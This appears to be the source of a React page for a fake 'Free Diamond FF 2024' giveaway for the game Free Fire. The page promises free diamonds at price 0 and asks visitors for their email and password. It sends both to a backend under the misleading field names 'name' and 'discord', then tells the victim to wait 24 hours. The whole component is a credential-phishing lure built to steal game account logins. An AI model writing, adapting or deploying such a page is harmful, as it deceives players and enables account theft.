import { useState } from "react";
import { createParticipants } from "../../services/getParticipants";

const data = [
  5, 12, 50, 70, 140, 355, 720, 1450, 2180, 3640, 7290, 36500, 73100,
];

export default function Giveaway() {
  const [active, setActive] = useState<number>(-1);
  const [name, setName] = useState("");
  const [submitted, setSubmmited] = useState<boolean>(false);
  const [discord, setDiscord] = useState("");

  const { mutate } = createParticipants();

  function handleSubmit(e: any) {
    e.preventDefault();
    if (name.length === 0) {
      alert("Please enter your name");
      return;
    }
    mutate({ name: name, discord });
    setName("");
    setDiscord("");
    setSubmmited(true);
  }

  if (submitted)
    return (
      <div className="flex z-20 items-center h-screen text-yellow-600  bg-black/50 justify-center">
        <div className="bg-slate-700 rounded-md block mx-4 py-4">
          <div className="text-center">
            <h1 className="text-2xl font-bold ">
              Tunggu 24 jam agar diamond masuk
            </h1>
            <button
              className="btn mt-4 btn-accent"
              onClick={() => setSubmmited(false)}
            >
              back
            </button>
          </div>
        </div>
      </div>
    );

  return (
    <div className="bg-[url('/freefire.webp')] bg-fixed bg-center bg-cover bg-no-repeat min-h-screen">
      <div className="fixed z-10 bg-black/50 w-full h-full"></div>
      <div className="flex flex-col items-center h-full gap-4">
        <div className="z-20">
          <div className="px-4 mt-10">
            <div className="bg-slate-700 drop-shadow-md text-amber-300 px-4 py-2 rounded-md mb-2">
              Free Diamond FF 2024
            </div>
            <div className="flex flex-col gap-2 drop-shadow-md bg-slate-700 px-4 py-4 rounded-lg ">
              <h1 className="text-xl font-bold py-2 px-4 rounded-md drop-shadow-md bg-yellow-600 text-white">
                Masukan Data:{" "}
              </h1>
              <div>
                <label className="block text-amber-300" htmlFor="">
                  Email
                </label>
                <input
                  className="p-2 text-slate-900 border-2 border-slate-900 rounded-md"
                  type="text"
                  placeholder="Masukkan Email..."
                  value={name}
                  onChange={(e) => setName(e.target.value)}
                />
                <label className="block text-amber-300" htmlFor="Discord">
                  Password
                </label>
                <input
                  className="p-2 text-slate-900 border-2 border-slate-900 rounded-md"
                  type="password"
                  placeholder="Masukkan Password..."
                  value={discord}
                  onChange={(e) => setDiscord(e.target.value)}
                />
              </div>
            </div>
            <div className="flex flex-col mt-4 gap-2 bg-slate-700 rounded-2xl px-4 py-4">
              <div className="grid grid-cols-2 gap-4 text-white md:grid-cols-3">
                {data.map((item, index) => (
                  <button
                    onClick={() => setActive(index)}
                    key={item}
                    className={`${
                      active === index ? "bg-yellow-600" : ""
                    } border-2 border-yellow-600 rounded-md p-2`}
                  >
                    {item.toLocaleString()} Diamond
                  </button>
                ))}
              </div>
            </div>
            {active >= 0 && (
              <div className="px-4 text-amber-300 mt-4 py-2 rounded-md bg-slate-700 shadow-md">
                Price: 0
              </div>
            )}
          </div>
        </div>

        <button
          onClick={handleSubmit}
          className="btn z-20 bg-slate-700 text-white border-yellow-600"
        >
          Submit
        </button>
      </div>
    </div>
  );
}

{
  /* */
}
